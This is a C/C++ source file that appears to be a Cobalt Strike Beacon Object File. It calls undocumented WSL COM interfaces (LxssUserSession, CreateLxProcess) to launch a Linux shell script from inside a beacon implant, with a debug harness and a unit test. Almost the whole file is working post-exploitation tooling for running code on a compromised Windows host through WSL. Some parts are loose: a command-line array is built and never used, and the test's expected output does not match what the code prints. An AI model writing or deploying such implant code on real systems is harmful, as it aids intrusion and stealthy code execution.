#include <Windows.h>
#include "base\helpers.h"
#define WIN32_LEAN_AND_MEAN  // Exclude rarely-used stuff from Windows headers

#ifdef _DEBUG
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#include "base\mock.h"
#endif

extern "C" {
#define CINTERFACE
#include "beacon.h"
#include "sleepmask.h"
#include "base/helpers.h"
#include "wslservice_h.h"
#pragma comment(lib, "ws2_32.lib")

#pragma comment(lib, "ole32.lib")
    static const GUID CLSID_WslService = {
0xF122531F,
0x326B,
0x4514,
{ 0x85, 0xAE, 0xDC, 0x99, 0xD3, 0x1D, 0x82, 0x56 } };

    static const GUID IID_IWSLService = {
    0x50047071,
    0x122C,
    0x4CAD,
    { 0x9C, 0x93, 0x94, 0x72, 0x0E, 0xB7, 0x7B, 0x06 } };

    static const GUID IID_ILxssUserSession = {
    0x536A6BCF,
    0xFE04,
    0x41D9,
    { 0xB9, 0x78, 0xDC, 0xAC, 0xA9, 0xA9, 0xB5, 0xB9 } };

    static const GUID CLSID_LxssUserSession1 = {
    0x4F476546,
    0xB412,
    0x4579,
    { 0xB6, 0x4C, 0x12, 0x3D, 0xF3, 0x31, 0xE3, 0xD6 } };

    static const GUID IID_ILxssUserSession2 = {
    0x38541BDC,
    0xF54F,
    0x4CEB,
    { 0x85, 0xD0, 0x37, 0xF0, 0xF3, 0xD2, 0x61, 0x7E } };
    static const GUID CLSID_LxssUserSession2 = {
    0xA9B7A1B9,
    0x0671,
    0x405C,
    { 0x95, 0xF1, 0xE0, 0x61, 0x2C, 0xB4, 0xCE, 0x7E } };
    // Correct GUIDs from the header file
        // Forward declare WSAStartup/WSACleanup without including winsock2.h


    // Declare WSAStartup and WSACleanup
    DFR(WS2_32, WSAStartup);
    DFR(WS2_32, WSACleanup);

#define MAKEWORD(a, b) ((WORD)(((BYTE)(((DWORD_PTR)(a)) & 0xff)) | ((WORD)((BYTE)(((DWORD_PTR)(b)) & 0xff))) << 8))


    void initializeCom(void) {
        HRESULT hr;
        ILxssUserSession* session = NULL;
        WSADATA wsaData;

        // Initialize Winsock
        int wsaResult = WS2_32$WSAStartup(MAKEWORD(2, 2), &wsaData);
        if (wsaResult != 0) {
            BeaconPrintf(CALLBACK_ERROR, "WSAStartup failed: %d", wsaResult);
            return;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "WSAStartup successful");

        // Initialize COM
        DFR_LOCAL(OLE32, CoInitializeEx);
        hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
        if (FAILED(hr)) {
            BeaconPrintf(CALLBACK_ERROR, "CoInitializeEx failed: 0x%08X", hr);
            return;
        }

        // Initialize COM security
        DFR_LOCAL(OLE32, CoInitializeSecurity);
        hr = CoInitializeSecurity(
            NULL,
            -1,
            NULL,
            NULL,
            RPC_C_AUTHN_LEVEL_DEFAULT,
            RPC_C_IMP_LEVEL_IMPERSONATE,  // Changed from SecurityDelegation
            NULL,
            EOAC_STATIC_CLOAKING,
            NULL
        );
        // Note: CoInitializeSecurity can return RPC_E_TOO_LATE if already called, which is okay
        if (FAILED(hr) && hr != RPC_E_TOO_LATE) {
            BeaconPrintf(CALLBACK_ERROR, "CoInitializeSecurity failed: 0x%08X", hr);
        }

        // Create WSL session instance
        hr = CoCreateInstance(CLSID_LxssUserSession2, nullptr, CLSCTX_LOCAL_SERVER, IID_ILxssUserSession2, (LPVOID*)&session);


        if (FAILED(hr)) {
            BeaconPrintf(CALLBACK_ERROR, "CoCreateInstance failed: 0x%08X", hr);
            BeaconPrintf(CALLBACK_ERROR, "Make sure WSL is installed and running");
            CoUninitialize();
            return;
        }

        BeaconPrintf(CALLBACK_OUTPUT, "WSL COM session created successfully");

        if (session) {
            // Initialize error info structure
            LXSS_ERROR_INFO errorInfo = { 0 };
            GUID distroGuid = { 0 };

            // Get distribution ID
            hr = session->lpVtbl->GetDistributionId(
                session,
                L"Debian",  // Change to your distro name
                0,
                &errorInfo,
                &distroGuid
            );

            if (FAILED(hr)) {
                BeaconPrintf(CALLBACK_ERROR, "GetDistributionId failed: 0x%08X", hr);
                if (errorInfo.Message) {
                    BeaconPrintf(CALLBACK_ERROR, "Error: %S", errorInfo.Message);
                    CoTaskMemFree(errorInfo.Message);
                }
                if (errorInfo.Warnings) {
                    CoTaskMemFree(errorInfo.Warnings);
                }
                session->lpVtbl->Release(session);
                CoUninitialize();
                return;
            }

            BeaconPrintf(CALLBACK_OUTPUT, "Found distro: {%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",
                distroGuid.Data1, distroGuid.Data2, distroGuid.Data3,
                distroGuid.Data4[0], distroGuid.Data4[1], distroGuid.Data4[2],
                distroGuid.Data4[3], distroGuid.Data4[4], distroGuid.Data4[5],
                distroGuid.Data4[6], distroGuid.Data4[7]);

            const char* commandLine[3];
            commandLine[0] = "-c";
            commandLine[1] = "cat";
            commandLine[2] = NULL;  // NULL terminator is important!

            // Initialize standard handles
            LXSS_STD_HANDLES stdHandles = { 0 };
            stdHandles.StdIn.Handle = 0;
            stdHandles.StdIn.HandleType = LxssHandleConsole;
            stdHandles.StdOut.Handle = 0;
            stdHandles.StdOut.HandleType = LxssHandleConsole;
            stdHandles.StdErr.Handle = 0;
            stdHandles.StdErr.HandleType = LxssHandleConsole;

            // Output handles
            GUID distributionId = { 0 };
            GUID instanceId = { 0 };
            HANDLE processHandle = NULL;
            HANDLE serverHandle = NULL;
            HANDLE stdinHandle = NULL;
            HANDLE stdoutHandle = NULL;
            HANDLE stderrHandle = NULL;
            HANDLE commChannel = NULL;
            HANDLE interopSocket = NULL;
            LXSS_ERROR_INFO createError = { 0 };

            // Create the Linux process
            hr = session->lpVtbl->CreateLxProcess(
                session,
                &distroGuid,              // DistroGuid
                "/home/defaultuser/sleep2.sh",              // Filename
                0,                        // CommandLineCount
                NULL,     // CommandLine
                NULL,                  // CurrentWorkingDirectory (use L prefix for wide string)
                NULL,                     // NtPath
                NULL,                     // NtEnvironment
                0,                        // NtEnvironmentLength
                NULL,                     // Username (NULL = default user)
                80,                       // Columns
                25,                       // Rows
                LXSS_HANDLE_USE_CONSOLE,  // ConsoleHandle
                &stdHandles,              // StdHandles
                0,                        // Flags
                &distributionId,          // DistributionId (output)
                &instanceId,              // InstanceId (output)
                &processHandle,           // ProcessHandle (output)
                &serverHandle,            // ServerHandle (output)
                &stdinHandle,             // StandardIn (output)
                &stdoutHandle,            // StandardOut (output)
                &stderrHandle,            // StandardErr (output)
                &commChannel,             // CommunicationChannel (output)
                &interopSocket,           // InteropSocket (output)
                &createError              // Error (output)
            );

            if (FAILED(hr)) {
                BeaconPrintf(CALLBACK_ERROR, "CreateLxProcess failed: 0x%08X", hr);
                if (createError.Message) {
                    BeaconPrintf(CALLBACK_ERROR, "Error: %S", createError.Message);
                    CoTaskMemFree(createError.Message);
                }
                if (createError.Warnings) {
                    BeaconPrintf(CALLBACK_ERROR, "Warnings: %S", createError.Warnings);
                    CoTaskMemFree(createError.Warnings);
                }
            }
            else {
                BeaconPrintf(CALLBACK_OUTPUT, "WSL process created successfully!");

                // Wait for process completion (optional - may want to make this async)
                if (processHandle) {
                    DWORD waitResult = WaitForSingleObject(processHandle, 10000); // 10 second timeout
                    if (waitResult == WAIT_OBJECT_0) {
                        DWORD exitCode = 0;
                        if (GetExitCodeProcess(processHandle, &exitCode)) {
                            BeaconPrintf(CALLBACK_OUTPUT, "Process exited with code: %d", exitCode);
                        }
                    }
                    else if (waitResult == WAIT_TIMEOUT) {
                        BeaconPrintf(CALLBACK_OUTPUT, "Process still running after timeout");
                    }
                    CloseHandle(processHandle);
                }

                // Clean up handles
                if (serverHandle) CloseHandle(serverHandle);
                if (stdinHandle) CloseHandle(stdinHandle);
                if (stdoutHandle) CloseHandle(stdoutHandle);
                if (stderrHandle) CloseHandle(stderrHandle);
                if (commChannel) CloseHandle(commChannel);
                if (interopSocket) CloseHandle(interopSocket);
            }

            // Release the session
            session->lpVtbl->Release(session);
        }

        // Uninitialize COM
        CoUninitialize();
    }

    // Define the Dynamic Function Resolution declaration for the GetLastError function
    DFR(KERNEL32, GetLastError);
    // Map GetLastError to KERNEL32$GetLastError
#define GetLastError KERNEL32$GetLastError

    void go(char* args, int len) {
        BeaconPrintf(CALLBACK_OUTPUT, "Starting WSL BOF...");

        // Initialize COM and execute WSL command
        initializeCom();

        // Original system directory test
        DFR_LOCAL(KERNEL32, GetSystemDirectoryA);
        char path[MAX_PATH + 1];
        UINT bytesCopied = GetSystemDirectoryA(path, sizeof(path));

        if (bytesCopied == 0) {
            BeaconPrintf(CALLBACK_ERROR, "GetSystemDirectoryA Error: %i", GetLastError());
        }
        else if (bytesCopied <= sizeof(path)) {
            BeaconPrintf(CALLBACK_OUTPUT, "System Directory: %s", path);
        }
    }
}

// Define a main function for the debug build
#if defined(_DEBUG) && !defined(_GTEST)

int main(int argc, char* argv[]) {
    // Run BOF's entrypoint
    bof::runMocked<>(go);
    return 0;
}

// Define unit tests
#elif defined(_GTEST)
#include <gtest\gtest.h>

TEST(BofTest, Test1) {
    std::vector<bof::output::OutputEntry> got = bof::runMocked<>(go);
    std::vector<bof::output::OutputEntry> expected = {
        {CALLBACK_OUTPUT, "System Directory: C:\\Windows\\system32"}
    };

    ASSERT_EQ(expected.size(), got.size());
    ASSERT_STRCASEEQ(expected[0].output.c_str(), got[0].output.c_str());
}
#endif